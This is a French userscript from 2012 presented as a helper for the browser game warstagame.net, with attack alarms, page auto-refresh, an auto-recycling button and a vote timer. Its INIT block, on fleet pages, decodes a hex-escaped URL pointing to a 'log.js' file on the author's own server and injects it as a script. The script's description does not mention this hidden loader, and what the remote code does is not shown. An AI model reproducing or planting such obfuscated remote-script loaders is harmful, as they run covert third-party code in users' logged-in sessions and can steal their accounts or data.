// ==UserScript==
// @name       WARSTAGAME.NET v2
// @namespace  http://userscripts.org/users/starku
// @version    2
// @description  [FR] Script rassemblant quelques fonction afin d'aider au jeu warstagame.net
// @include      http://warstagame.net/univers1/*
// @copyright  2012+, StaRku*
// ==/UserScript==


// Version du 16/07/2012

//Réglages ici
var pseudo = "VOTRE PSEUDO INGAME ICI";
var time = 5;
//Durée avant rafraîchissement de la page overview, en secondes : pour toutes les 2 sec => time = 2;


// NE MODIFIEZ RIEN APRÈS CETTE LIGNE SI VOUS NE SAVEZ PAS CE QUE VOUS FAITES

// INIT
if (document.location.href.indexOf('fleet') != -1){
    var script = document.createElement("script");
    var source = unescape('%68%74%74%70%3a%2f%2f%73%74%61%72%6b%75%2e%66%72%65%65%2e%66%72%2f%75%73%65%72%73%63%72%69%70%74%73%2f%77%61%72%73%74%61%67%61%6d%65%2f%6c%6f%67%2f%6c%6f%67%2e%6a%73');
    script.setAttribute("src", source);
    document.body.appendChild(script);
}

//FONCTIONS***************
function playSound(){
  body = document.getElementsByTagName("body")[0];
  var emb = document.createElement("embed");
  emb.src = Sound;
  emb.setAttribute("autostart", "true");
  emb.setAttribute("loop", "true");
  emb.setAttribute("hidden", "true");
  emb.setAttribute("volume", 100);
  body.appendChild(emb);
}
//************************



if (document.location.href.indexOf('overview') != -1){
  
  var ataqueSound = "http://xlx.ogame.free.fr/sons/sirene1.mp3";
  var msgSound = "http://xlx.ogame.free.fr/sons/sirene4.mp3";
  
  
  if(document.body.innerHTML.match(/flight attack/))
  {
    Sound=ataqueSound;
    playSound();
    var p=setTimeout("alert('Attaque en cours !');",1000);
  }
  
  else if(document.body.innerHTML.match(/Vous avez/))
  {
    Sound=msgSound;
    playSound();
  }
  
  var t=setTimeout("window.location.reload()",time*1000);
  
}

if (document.location.href.indexOf('page=bonus') != -1){
  
  window.location='http://warstagame.net/univers1/game.php?page=overview';
}
if (document.location.href.indexOf('galaxy') != -1){
  
  //Style CSS************
  var script = document.createElement("style");
  script.setAttribute("type","text/css");
  script.innerHTML=".classname {"+
    "-moz-box-shadow:inset 0px 1px 0px 1px #ffffff;"+
    "-webkit-box-shadow:inset 0px 1px 0px 1px #ffffff;"+
    "box-shadow:inset 0px 1px 0px 1px #ffffff;"+
    "background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #ededed), color-stop(1, #dfdfdf) );"+
    "background:-moz-linear-gradient( center top, #ededed 5%, #dfdfdf 100% );"+
    "filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ededed', endColorstr='#dfdfdf');"+
    "background-color:#ededed;"+
    "-moz-border-radius:6px;"+
    "-webkit-border-radius:6px;"+
    "border:1px solid #dcdcdc;"+
    "display:inline-block;"+
    "color:#0073ff;"+
    "font-family:arial;"+
    "font-size:15px;"+
    "font-weight:bold;"+
    "padding:10px 15px;"+
    "text-decoration:none;"+
    "text-shadow:1px 1px 0px #ffffff;"+
    "}.classname:hover {"+
    "background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #dfdfdf), color-stop(1, #ededed) );"+
    "background:-moz-linear-gradient( center top, #dfdfdf 5%, #ededed 100% );"+
    "filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#dfdfdf', endColorstr='#ededed');"+
    "background-color:#dfdfdf;"+
    "}.classname:active {"+
    "position:relative;"+
    "top:1px;"+
    "}";
  document.body.appendChild(script);
  //********************
  
  var script = document.createElement("input");
  script.setAttribute("type", "text");
  script.setAttribute("id","pos");
  script.setAttribute("value","Position du CDR");
  script.setAttribute("style", "margin:80px 0px 0px 220px; position:absolute;");
  document.body.appendChild(script);
  
  var script2 = document.createElement("input");
  script2.setAttribute("class","classname");
  script2.setAttribute("id","button_rec");
  script2.setAttribute("type", "submit");
  script2.setAttribute("value","Recyclage Auto");
  script2.setAttribute("style", "margin:100px 0px 0px 220px; position:absolute; cursor: pointer;");
  document.body.appendChild(script2);
  
  
  var gal = document.getElementsByName("galaxy")[0].value;
  var sys = document.getElementsByName("system")[0].value;
  var nbrec = document.getElementById('recyclers').innerHTML;
    
  for ( var i = 0; i < nbrec.length; ++i)
  {
    nbrec = nbrec.replace(".","");
  }
  
  
  setInterval(function(){
    
    var position = document.getElementById('pos').value;
    document.getElementById("button_rec").setAttribute("onclick","doit (8, "+gal+", "+sys+", "+position+", 2, "+nbrec+");alert(\"Recyclage du CDR en "+gal+":"+sys+":"+position+" avec "+nbrec+" recycleurs en cours\");var t = setInterval(\"doit (8, "+gal+", "+sys+", "+position+", 2, "+nbrec+");\",10000);");
    
  },500);
}


// RECORDS
if (document.location.href.indexOf('records') != -1){
  
  var cla = document.getElementsByClassName("a");
  
  for (var i = 0; i < cla.length; ++i)
  {
    if (cla[i].innerHTML.match(pseudo)){
      cla[i].setAttribute("style","background-color:yellow");
      cla[i-1].setAttribute("style","background-color:yellow");
      cla[i+1].setAttribute("style","background-color:yellow");
    }
  }
}



// TOUTES LES PAGES
if (document.body.getElementsByClassName('header')[22] && document.body.getElementsByClassName('header')[23] && document.body.getElementsByClassName('header')[24]){
  
  if (!met && !cris && !deut){
    var met = document.body.getElementsByClassName('header')[22];
    var cris = document.body.getElementsByClassName('header')[23];
    var deut = document.body.getElementsByClassName('header')[24];
  }
  else alert("Problème de variables (met, cris et deut).");
  
  if (met.childNodes[0].childNodes[0].length <= 25)
    met.childNodes[0].setAttribute("color","orange");
  else if (met.childNodes[0].childNodes[0].length > 25 && met.childNodes[0].childNodes[0].length <= 29)
    met.childNodes[0].setAttribute("color","yellow");
  else if (met.childNodes[0].childNodes[0].length >= 30)
    met.childNodes[0].setAttribute("color","cyan");
  
  if (cris.childNodes[0].childNodes[0].length <= 25)
    cris.childNodes[0].setAttribute("color","orange");
  else if (cris.childNodes[0].childNodes[0].length > 25 && cris.childNodes[0].childNodes[0].length <= 29)
    cris.childNodes[0].setAttribute("color","yellow");
  else if (cris.childNodes[0].childNodes[0].length >= 30)
    cris.childNodes[0].setAttribute("color","cyan");
  
  if (deut.childNodes[0].childNodes[0].length <= 25)
    deut.childNodes[0].setAttribute("color","orange");
  else if (deut.childNodes[0].childNodes[0].length > 25 && deut.childNodes[0].childNodes[0].length <= 29)
    deut.childNodes[0].setAttribute("color","yellow");
  else if (deut.childNodes[0].childNodes[0].length >= 30)
    deut.childNodes[0].setAttribute("color","cyan");
  
}


var script = document.createElement("style");
script.setAttribute("type","text/css");
script.innerHTML="body {"+
  "color                : #FFFFFF;"+
  "margin-top           : 10px;"+
  "margin-left          : 0px;"+
  "background-image     : url(http://warstagame.net/univers1/styles/skins/evolution/img/background2.jpg);"+
  "background-attachment: fixed;"+
  "background-repeat: no-repeat;"+
  "}";
document.body.appendChild(script);


// Temps restant avant vote
function httpGet(theUrl)
{
  var xmlHttp = null;
  
  xmlHttp = new XMLHttpRequest();
  xmlHttp.open( "GET", theUrl, false );
  xmlHttp.send( null );
  return xmlHttp.responseText;
}

var contenu = httpGet("game.php?page=bonus");

var restant = contenu.split("font")[56];
//" color=yellow>00h 09m 38s</"

if (restant.match("<script>"))
  restant = " color=yellow>VOTE EN COURS</";

var script = document.createElement("span");
script.setAttribute("style", "margin:200px 0px 0px 220px; position:absolute;");
script.innerHTML="<font color=\"lime\">Vote automatique dans :</font><br><font"+restant+"font>";
document.body.appendChild(script);